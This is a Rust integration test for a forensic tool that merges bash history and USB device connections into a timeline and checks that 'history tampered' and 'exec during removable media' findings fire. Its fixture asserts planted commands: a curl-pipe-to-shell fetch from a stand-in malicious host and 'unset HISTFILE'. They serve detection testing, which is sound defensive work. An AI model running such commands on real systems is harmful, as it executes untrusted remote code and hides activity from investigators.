#![allow(clippy::unwrap_used, clippy::expect_used)]
//! End-to-end Doer-Checker validation over the **genuine published reader types**.
//!
//! The shell activities are derived from a real `.bash_history` file written by an
//! actual `bash` subshell (not a synthetic string) and decoded with the published
//! `shellhist_core::parse_auto`; the device is a real `peripheral_core::DeviceConnection`
//! shaped like a USB mass-storage stick. We assert that the timeline merges across
//! the two sources and that both v0.1 cross-source findings fire.
//!
//! The generator command for the history fixture is recorded in
//! `tests/data/README.md`.

use peripheral_core::{Bus, DeviceConnection, Provenance, Stamp};
use shellhist_core::parse_auto;
use useract_forensic::{
    audit, build_timeline, Action, DeviceSource, ShellHistorySource, SourceKind, Subject,
};

const REAL_BASH: &[u8] = include_bytes!("data/real_bash_history");

/// A USB mass-storage connection whose first-seen epoch lands inside the history's
/// command window (the genuine `bash` epochs are around 1.78e9).
fn usb_stick(first_install: i64, volume_serial: u32) -> DeviceConnection {
    DeviceConnection {
        bus: Bus::Usb,
        device_class_guid: None,
        vid: Some(0x0781),
        pid: Some(0x5583),
        device_serial: Some("1234567890AB".to_string()),
        serial_is_os_generated: false,
        friendly_name: None,
        device_instance_id: "USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra\\1234567890AB".to_string(),
        first_install: Some(Stamp::authoritative(first_install)),
        last_install: None,
        last_arrival: None,
        last_removal: None,
        parent_id_prefix: None,
        volume_guid: None,
        drive_letter: None,
        volume_serial: Some(volume_serial),
        disk_signature: None,
        dma_capable: false,
        mitre: Vec::new(),
        source: Provenance {
            file: "setupapi.dev.log".to_string(),
            line: 1,
        },
    }
}

#[test]
fn real_history_parses_and_carries_timestamps() {
    let entries = parse_auto(REAL_BASH, Some(".bash_history"));
    assert!(!entries.is_empty(), "real history must yield entries");
    assert!(
        entries.iter().all(|e| e.timestamp.is_some()),
        "bash wrote #<epoch> lines, every entry should be timestamped"
    );
    assert!(
        entries
            .iter()
            .any(|e| e.command == "curl http://malicious.example/payload.sh | sh"),
        "the planted curl|sh command must be present"
    );
    assert!(
        entries.iter().any(|e| e.command == "unset HISTFILE"),
        "the planted history-clearing command must be present"
    );
}

#[test]
fn timeline_merges_real_shell_and_device_sources_in_time_order() {
    let entries = parse_auto(REAL_BASH, Some(".bash_history"));
    // Anchor the device connect to the curl|sh command's epoch so they share a window.
    let curl_ts = entries
        .iter()
        .find(|e| e.command.starts_with("curl "))
        .and_then(|e| e.timestamp)
        .expect("curl command must be timestamped");
    let device = [usb_stick(curl_ts, 0xDEAD_BEEF)];

    let shell = ShellHistorySource::new(&entries);
    let devices = DeviceSource::new(&device);
    let timeline = build_timeline(&[&shell, &devices]);

    // Both sources contributed.
    assert!(timeline
        .iter()
        .any(|a| a.source == SourceKind::ShellHistory));
    assert!(timeline
        .iter()
        .any(|a| a.source == SourceKind::PeripheralDevice));

    // Timestamps are non-decreasing across the merged timeline.
    let stamped: Vec<i64> = timeline.iter().filter_map(|a| a.timestamp).collect();
    assert!(
        stamped.windows(2).all(|w| w[0] <= w[1]),
        "merged timeline must be sorted by epoch: {stamped:?}"
    );

    // The device connection is present as a Connected activity carrying the volume serial.
    assert!(timeline.iter().any(|a| matches!(
        (&a.action, &a.subject),
        (
            Action::Connected,
            Subject::Device {
                volume_serial: Some(0xDEAD_BEEF),
                ..
            }
        )
    )));
}

#[test]
fn both_v01_cross_source_findings_fire_on_real_data() {
    let entries = parse_auto(REAL_BASH, Some(".bash_history"));
    let curl_ts = entries
        .iter()
        .find(|e| e.command.starts_with("curl "))
        .and_then(|e| e.timestamp)
        .expect("curl command must be timestamped");
    let device = [usb_stick(curl_ts, 0xDEAD_BEEF)];

    let shell = ShellHistorySource::new(&entries);
    let devices = DeviceSource::new(&device);
    let timeline = build_timeline(&[&shell, &devices]);
    let findings = audit(&timeline);

    let codes: Vec<&str> = findings.iter().map(|f| f.code.as_ref()).collect();
    assert!(
        codes.contains(&"USERACT-HISTORY-TAMPERED"),
        "history-clearing not surfaced; got {codes:?}"
    );
    assert!(
        codes.contains(&"USERACT-EXEC-DURING-REMOVABLE-MEDIA"),
        "exec-during-removable-media not surfaced; got {codes:?}"
    );

    // Doer-Checker: every finding is a hedged observation, never a verdict.
    for f in &findings {
        let note = f.note.to_ascii_lowercase();
        assert!(
            note.contains("consistent with"),
            "note must hedge: {}",
            f.note
        );
        assert!(
            !note.contains("proves") && !note.contains("confirms"),
            "verdict language: {}",
            f.note
        );
    }
}
